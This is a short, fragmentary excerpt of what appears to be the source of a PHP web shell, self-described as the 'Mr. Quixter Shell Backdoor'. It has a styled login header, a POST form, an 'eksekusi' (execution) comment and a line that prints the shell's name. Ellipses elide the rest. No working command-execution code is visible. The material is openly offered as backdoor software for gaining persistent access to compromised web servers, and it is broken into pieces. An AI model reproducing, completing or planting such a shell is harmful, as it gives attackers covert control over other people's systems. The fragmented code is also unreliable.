...
<header>
	...
	<font style="color:#000;text-shadow:0px 5px 8px #191970;font-size:90px" face="Ubuntu">Mr. Quixter Login Shell</font><br>
	<img src="https://i.ibb.co/SNdNcbx/20190725-072646.png" width=10% height=10%>
<form method="post">
...
//eksekusi
echo "Name of Shell: <font style='color:#00f;text-shadow:5px 5px 12px #191970;font-size:15px' face='Wallpoet'>Mr. Quixter Shell Backdoor</font><br>";
